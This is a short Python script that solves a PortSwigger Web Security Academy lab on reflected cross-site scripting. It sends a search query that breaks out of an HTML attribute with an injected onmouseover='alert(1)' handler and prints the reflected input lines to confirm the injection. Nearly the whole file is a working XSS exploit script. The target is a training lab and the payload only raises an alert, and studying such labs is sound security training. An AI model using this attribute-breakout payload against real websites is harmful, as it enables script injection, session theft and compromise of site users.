"""
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

odin_id = 'baa'
search_term = f'''{odin_id}" onmouseover="alert(1)'''
search_url = f'https://{site}/?search={search_term}'
resp = s.get(search_url)
for line in resp.text.split('\n'):
    if 'input' in line:
        print(line)